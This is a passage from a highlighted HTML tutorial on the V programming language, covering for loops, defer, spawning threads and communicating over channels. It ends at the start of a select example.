</span></span><span style="display:flex;"><span>    println(<span style="color:#960050;background-color:#1e0010">&#39;$</span>{<span style="color:#a6e22e">key</span>} <span style="color:#f92672">-</span>&gt; <span style="color:#960050;background-color:#1e0010">$</span>{<span style="color:#a6e22e">value</span>}<span style="color:#960050;background-color:#1e0010">&#39;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Output: one -&gt; 1</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">//         two -&gt; 2</span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// iterate over keys</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> <span style="color:#a6e22e">key</span>, <span style="color:#a6e22e">_</span> <span style="color:#a6e22e">in</span> <span style="color:#a6e22e">m</span> {
</span></span><span style="display:flex;"><span>    println(<span style="color:#a6e22e">key</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Output: one</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">//         two</span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// iterate over values</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> <span style="color:#a6e22e">_</span>, <span style="color:#a6e22e">value</span> <span style="color:#a6e22e">in</span> <span style="color:#a6e22e">m</span> {
</span></span><span style="display:flex;"><span>    println(<span style="color:#a6e22e">value</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Output: 1</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">//         2</span>
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>While executing a ranged <code>for</code>, <code>low..high</code> means an exclusive range, which represents all values from <code>low</code> up to but not including <code>high</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#75715e">// Prints &#39;01234&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> <span style="color:#a6e22e">i</span> <span style="color:#a6e22e">in</span> <span style="color:#ae81ff">0</span> .. <span style="color:#ae81ff">5</span> {
</span></span><span style="display:flex;"><span>    print(<span style="color:#a6e22e">i</span>)
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>A conditional <code>for</code> is of the forms</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#a6e22e">mut</span> <span style="color:#a6e22e">sum</span> <span style="color:#f92672">:=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">mut</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">:=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">100</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">sum</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">i</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">i</span><span style="color:#f92672">++</span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>println(<span style="color:#a6e22e">sum</span>) <span style="color:#75715e">// &#34;5050&#34;</span>
</span></span></code></pre></div><p>This form of the loop is similar to while loops in other languages. The loop will stop iterating once the boolean condition evaluates to false. Again, there are no parentheses surrounding the condition, and the braces are always required.</p>
<p>Finally, there&rsquo;s the traditional C style <code>for</code> loop. It&rsquo;s safer than the while form because with the latter it&rsquo;s easy to forget to update the counter and get stuck in an infinite loop.</p>
<p>Here <code>i</code> doesn&rsquo;t need to be declared with <code>mut</code> since it&rsquo;s always going to be mutable by definition.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#66d9ef">for</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">:=</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">i</span> &lt; <span style="color:#ae81ff">10</span>; <span style="color:#a6e22e">i</span> <span style="color:#f92672">+=</span> <span style="color:#ae81ff">2</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Don&#39;t print 6</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">6</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">continue</span>
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    println(<span style="color:#a6e22e">i</span>)
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>V also supports <a href="https://docs.vlang.io/statements-&amp;-expressions.html#custom-iterators">custom iterators</a>.</p>
<h4 id="defer">Defer</h4>
<p>A <code>defer {}</code> statement, defers the execution of the block of statements until the surrounding scope of the defer ends. It is a convenient feature that allows you to group related actions (getting access to a resource and cleaning/freeing it after you are done) closely together, instead of spreading them across multiple potentially very remote lines of code.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#f92672">import</span> <span style="color:#a6e22e">os</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fn</span> <span style="color:#a6e22e">read_log</span>() ! {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mut</span> <span style="color:#a6e22e">ok</span> <span style="color:#f92672">:=</span> <span style="color:#66d9ef">false</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mut</span> <span style="color:#a6e22e">f</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">os</span>.<span style="color:#a6e22e">open</span>(<span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">txt</span><span style="color:#960050;background-color:#1e0010">&#39;</span>)!
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">defer</span> { <span style="color:#a6e22e">f</span>.close() }
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// ...</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> !<span style="color:#a6e22e">ok</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// ...</span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// defer statement will be called here, the file will be closed</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span>
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// ...</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// defer statement will be called here too, the file will be closed</span>
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><blockquote>
<p>If the function returns a value the defer block is executed after the return expression is evaluated.</p>
</blockquote>
<h3 id="concurrency">Concurrency</h3>
<p>V&rsquo;s model of concurrency is similar to Go&rsquo;s.</p>
<p><code>go foo()</code> runs <code>foo()</code> concurrently in a lightweight thread managed by the V runtime.</p>
<p><code>spawn foo()</code> runs <code>foo()</code> concurrently in a different thread:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#f92672">import</span> <span style="color:#a6e22e">math</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fn</span> <span style="color:#a6e22e">p</span>(<span style="color:#a6e22e">a</span> <span style="color:#a6e22e">f64</span>, <span style="color:#a6e22e">b</span> <span style="color:#a6e22e">f64</span>) { <span style="color:#75715e">// ordinary function without return value</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">c</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">math</span>.<span style="color:#a6e22e">sqrt</span>(<span style="color:#a6e22e">a</span> <span style="color:#f92672">*</span> <span style="color:#a6e22e">a</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">b</span> <span style="color:#f92672">*</span> <span style="color:#a6e22e">b</span>)
</span></span><span style="display:flex;"><span>    println(<span style="color:#a6e22e">c</span>)
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fn</span> <span style="color:#a6e22e">main</span>() {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">spawn</span> <span style="color:#a6e22e">p</span>(<span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">4</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// p will be run in parallel thread</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// It can also be written as follows</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// spawn fn (a f64, b f64) {</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// 	c := math.sqrt(a * a + b * b)</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// 	println(c)</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// }(3, 4)</span>
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><blockquote>
<p>Threads rely on the machine&rsquo;s CPU (number of cores/threads). Be aware that OS threads spawned with spawn have limitations in regard to concurrency, including resource overhead and scalability issues, and might affect performance in cases of high thread count.</p>
</blockquote>
<p>Sometimes it is necessary to wait until a parallel thread has finished. This can be done by assigning a handle to the started thread and calling the wait() method to this handle later:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#f92672">import</span> <span style="color:#a6e22e">math</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fn</span> <span style="color:#a6e22e">p</span>(<span style="color:#a6e22e">a</span> <span style="color:#a6e22e">f64</span>, <span style="color:#a6e22e">b</span> <span style="color:#a6e22e">f64</span>) { <span style="color:#75715e">// ordinary function without return value</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">c</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">math</span>.<span style="color:#a6e22e">sqrt</span>(<span style="color:#a6e22e">a</span> <span style="color:#f92672">*</span> <span style="color:#a6e22e">a</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">b</span> <span style="color:#f92672">*</span> <span style="color:#a6e22e">b</span>)
</span></span><span style="display:flex;"><span>    println(<span style="color:#a6e22e">c</span>) <span style="color:#75715e">// prints `5`</span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fn</span> <span style="color:#a6e22e">main</span>() {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">h</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">spawn</span> <span style="color:#a6e22e">p</span>(<span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">4</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// p() runs in parallel thread</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">h</span>.<span style="color:#a6e22e">wait</span>()
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// p() has definitely finished</span>
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>This approach can also be used to get a return value from a function that is run in a parallel thread. There is no need to modify the function itself to be able to call it concurrently.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#f92672">import</span> <span style="color:#a6e22e">math</span> { <span style="color:#a6e22e">sqrt</span> }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fn</span> <span style="color:#a6e22e">get_hypot</span>(<span style="color:#a6e22e">a</span> <span style="color:#a6e22e">f64</span>, <span style="color:#a6e22e">b</span> <span style="color:#a6e22e">f64</span>) <span style="color:#a6e22e">f64</span> { <span style="color:#75715e">//       ordinary function returning a value</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">c</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">sqrt</span>(<span style="color:#a6e22e">a</span> <span style="color:#f92672">*</span> <span style="color:#a6e22e">a</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">b</span> <span style="color:#f92672">*</span> <span style="color:#a6e22e">b</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">c</span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fn</span> <span style="color:#a6e22e">main</span>() {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">g</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">spawn</span> <span style="color:#a6e22e">get_hypot</span>(<span style="color:#ae81ff">54.06</span>, <span style="color:#ae81ff">2.08</span>) <span style="color:#75715e">// spawn thread and get handle to it</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">h1</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">get_hypot</span>(<span style="color:#ae81ff">2.32</span>, <span style="color:#ae81ff">16.74</span>) <span style="color:#75715e">//   do some other calculation here</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">h2</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">g</span>.<span style="color:#a6e22e">wait</span>() <span style="color:#75715e">//                 get result from spawned thread</span>
</span></span><span style="display:flex;"><span>    println(<span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">Results</span>: <span style="color:#960050;background-color:#1e0010">$</span>{<span style="color:#a6e22e">h1</span>}, <span style="color:#960050;background-color:#1e0010">$</span>{<span style="color:#a6e22e">h2</span>}<span style="color:#960050;background-color:#1e0010">&#39;</span>) <span style="color:#75715e">//   prints `Results: 16.9, 54.1`</span>
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>If there is a large number of tasks, it might be easier to manage them using an array of <code>threads</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#f92672">import</span> <span style="color:#a6e22e">time</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fn</span> <span style="color:#a6e22e">task</span>(<span style="color:#a6e22e">id</span> <span style="color:#66d9ef">int</span>, <span style="color:#a6e22e">duration</span> <span style="color:#66d9ef">int</span>) {
</span></span><span style="display:flex;"><span>    println(<span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">task</span> <span style="color:#960050;background-color:#1e0010">$</span>{<span style="color:#a6e22e">id</span>} <span style="color:#a6e22e">begin</span><span style="color:#960050;background-color:#1e0010">&#39;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">time</span>.<span style="color:#a6e22e">sleep</span>(<span style="color:#a6e22e">duration</span> <span style="color:#f92672">*</span> <span style="color:#a6e22e">time</span>.<span style="color:#a6e22e">millisecond</span>)
</span></span><span style="display:flex;"><span>    println(<span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">task</span> <span style="color:#960050;background-color:#1e0010">$</span>{<span style="color:#a6e22e">id</span>} <span style="color:#a6e22e">end</span><span style="color:#960050;background-color:#1e0010">&#39;</span>)
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fn</span> <span style="color:#a6e22e">main</span>() {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mut</span> <span style="color:#a6e22e">threads</span> <span style="color:#f92672">:=</span> []<span style="color:#a6e22e">thread</span>{}
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">threads</span> <span style="color:#f92672">&lt;&lt;</span> <span style="color:#a6e22e">spawn</span> <span style="color:#a6e22e">task</span>(<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">500</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">threads</span> <span style="color:#f92672">&lt;&lt;</span> <span style="color:#a6e22e">spawn</span> <span style="color:#a6e22e">task</span>(<span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">900</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">threads</span> <span style="color:#f92672">&lt;&lt;</span> <span style="color:#a6e22e">spawn</span> <span style="color:#a6e22e">task</span>(<span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">100</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">threads</span>.<span style="color:#a6e22e">wait</span>()
</span></span><span style="display:flex;"><span>    println(<span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">done</span><span style="color:#960050;background-color:#1e0010">&#39;</span>)
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// Output:</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// task 1 begin</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// task 2 begin</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// task 3 begin</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// task 3 end</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// task 1 end</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// task 2 end</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// done</span>
</span></span></code></pre></div><p>Additionally for threads that return the same type, calling <code>wait()</code> on the thread array will return all computed values.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#a6e22e">fn</span> <span style="color:#a6e22e">expensive_computing</span>(<span style="color:#a6e22e">i</span> <span style="color:#66d9ef">int</span>) <span style="color:#66d9ef">int</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">*</span> <span style="color:#a6e22e">i</span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fn</span> <span style="color:#a6e22e">main</span>() {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mut</span> <span style="color:#a6e22e">threads</span> <span style="color:#f92672">:=</span> []<span style="color:#a6e22e">thread</span> <span style="color:#66d9ef">int</span>{}
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> <span style="color:#a6e22e">i</span> <span style="color:#a6e22e">in</span> <span style="color:#ae81ff">1</span> .. <span style="color:#ae81ff">10</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">threads</span> <span style="color:#f92672">&lt;&lt;</span> <span style="color:#a6e22e">spawn</span> <span style="color:#a6e22e">expensive_computing</span>(<span style="color:#a6e22e">i</span>)
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Join all tasks</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">r</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">threads</span>.<span style="color:#a6e22e">wait</span>()
</span></span><span style="display:flex;"><span>    println(<span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">All</span> <span style="color:#a6e22e">jobs</span> <span style="color:#a6e22e">finished</span>: <span style="color:#960050;background-color:#1e0010">$</span>{<span style="color:#a6e22e">r</span>}<span style="color:#960050;background-color:#1e0010">&#39;</span>)
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// Output: All jobs finished: [1, 4, 9, 16, 25, 36, 49, 64, 81]</span>
</span></span></code></pre></div><h3 id="concurrency-communicating-over-channels">Concurrency: communicating over Channels</h3>
<p>Channels are the preferred way to communicate between threads. They allow threads to exchange data safely without requiring explicit locking. V&rsquo;s channels are similar to those in Go, enabling you to push objects into a channel on one end and pop objects from the other. Channels can be buffered or unbuffered, and you can use the <code>select</code> statement to monitor multiple channels simultaneously.</p>
<p>Channels are declared with the type <code>chan</code> objtype. You can optionally specify a buffer length using the <code>cap</code> field:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#a6e22e">ch</span> <span style="color:#f92672">:=</span> <span style="color:#66d9ef">chan</span> <span style="color:#66d9ef">int</span>{} <span style="color:#75715e">// unbuffered - &#34;synchronous&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ch2</span> <span style="color:#f92672">:=</span> <span style="color:#66d9ef">chan</span> <span style="color:#a6e22e">f64</span>{<span style="color:#a6e22e">cap</span>: <span style="color:#ae81ff">100</span>} <span style="color:#75715e">// buffered with a capacity of 100</span>
</span></span></code></pre></div><p>You can define channels of various types, depending on the type of data you intend to pass via the channel (int, f64 in the example above).</p>
<p>Channels do not have to be declared as <code>mut</code>. <strong>The buffer length is not part of the type but a field of the individual channel object</strong>. Channels can be passed to threads like normal variables:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#f92672">import</span> <span style="color:#a6e22e">time</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fn</span> <span style="color:#a6e22e">worker</span>(<span style="color:#a6e22e">ch</span> <span style="color:#66d9ef">chan</span> <span style="color:#66d9ef">int</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> <span style="color:#a6e22e">i</span> <span style="color:#a6e22e">in</span> <span style="color:#ae81ff">0</span> .. <span style="color:#ae81ff">5</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">ch</span> <span style="color:#f92672">&lt;-</span> <span style="color:#a6e22e">i</span> <span style="color:#75715e">// push values into the channel</span>
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fn</span> <span style="color:#a6e22e">clock</span>(<span style="color:#a6e22e">ch</span> <span style="color:#66d9ef">chan</span> <span style="color:#66d9ef">int</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> <span style="color:#a6e22e">i</span> <span style="color:#a6e22e">in</span> <span style="color:#ae81ff">0</span> .. <span style="color:#ae81ff">5</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">time</span>.<span style="color:#a6e22e">sleep</span>(<span style="color:#ae81ff">1</span> <span style="color:#f92672">*</span> <span style="color:#a6e22e">time</span>.<span style="color:#a6e22e">second</span>)
</span></span><span style="display:flex;"><span>        println(<span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">Clock</span> <span style="color:#a6e22e">tick</span><span style="color:#960050;background-color:#1e0010">&#39;</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">ch</span> <span style="color:#f92672">&lt;-</span> (<span style="color:#a6e22e">i</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">1000</span>) <span style="color:#75715e">// push a value into the channel</span>
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">ch</span>.close() <span style="color:#75715e">// close the channel when done</span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fn</span> <span style="color:#a6e22e">main</span>() {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">ch</span> <span style="color:#f92672">:=</span> <span style="color:#66d9ef">chan</span> <span style="color:#66d9ef">int</span>{<span style="color:#a6e22e">cap</span>: <span style="color:#ae81ff">5</span>}
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">spawn</span> <span style="color:#a6e22e">worker</span>(<span style="color:#a6e22e">ch</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">spawn</span> <span style="color:#a6e22e">clock</span>(<span style="color:#a6e22e">ch</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">value</span> <span style="color:#f92672">:=</span> <span style="color:#f92672">&lt;-</span><span style="color:#a6e22e">ch</span> <span style="color:#a6e22e">or</span> { <span style="color:#75715e">// receive/pop values from the channel</span>
</span></span><span style="display:flex;"><span>            println(<span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">Channel</span> <span style="color:#a6e22e">closed</span><span style="color:#960050;background-color:#1e0010">&#39;</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        println(<span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">Received</span>: <span style="color:#960050;background-color:#1e0010">$</span>{<span style="color:#a6e22e">value</span>}<span style="color:#960050;background-color:#1e0010">&#39;</span>)
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Buffered channels allow you to push multiple items without blocking, as long as the buffer is not full:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#a6e22e">ch</span> <span style="color:#f92672">:=</span> <span style="color:#66d9ef">chan</span> <span style="color:#66d9ef">string</span>{<span style="color:#a6e22e">cap</span>: <span style="color:#ae81ff">2</span>}
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ch</span> <span style="color:#f92672">&lt;-</span> <span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">hello</span><span style="color:#960050;background-color:#1e0010">&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ch</span> <span style="color:#f92672">&lt;-</span> <span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">world</span><span style="color:#960050;background-color:#1e0010">&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// ch &lt;- &#39;!&#39; // This would block because the buffer is full</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>println(<span style="color:#f92672">&lt;-</span><span style="color:#a6e22e">ch</span>) <span style="color:#75715e">// &#34;hello&#34;</span>
</span></span><span style="display:flex;"><span>println(<span style="color:#f92672">&lt;-</span><span style="color:#a6e22e">ch</span>) <span style="color:#75715e">// &#34;world&#34;</span>
</span></span></code></pre></div><p>A channel can be closed to indicate that no further objects can be pushed. Any attempt to do so will then result in a runtime panic (with the exception of select and try_push() - see below). Attempts to pop will return immediately if the associated channel has been closed and the buffer is empty. This situation can be handled using an or {} block.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#a6e22e">ch</span> <span style="color:#f92672">:=</span> <span style="color:#66d9ef">chan</span> <span style="color:#66d9ef">int</span>{}
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ch2</span> <span style="color:#f92672">:=</span> <span style="color:#66d9ef">chan</span> <span style="color:#a6e22e">f64</span>{}
</span></span><span style="display:flex;"><span><span style="color:#75715e">// ...</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ch</span>.close()
</span></span><span style="display:flex;"><span><span style="color:#75715e">// ...</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">m</span> <span style="color:#f92672">:=</span> <span style="color:#f92672">&lt;-</span><span style="color:#a6e22e">ch</span> <span style="color:#a6e22e">or</span> {
</span></span><span style="display:flex;"><span>    println(<span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">channel</span> <span style="color:#a6e22e">has</span> <span style="color:#a6e22e">been</span> <span style="color:#a6e22e">closed</span><span style="color:#960050;background-color:#1e0010">&#39;</span>)
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// propagate error</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">y</span> <span style="color:#f92672">:=</span> <span style="color:#f92672">&lt;-</span><span style="color:#a6e22e">ch2</span> <span style="color:#960050;background-color:#1e0010">?</span>
</span></span></code></pre></div><h4 id="channel-select">Channel Select</h4>
<p>The <code>select</code> command allows monitoring several channels at the same time without noticeable CPU load. It consists of a list of possible transfers and associated branches of statements - similar to the match command:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#f92672">import</span> <span style="color:#a6e22e">time</span>
</span></span><span style="display:flex;"><span>
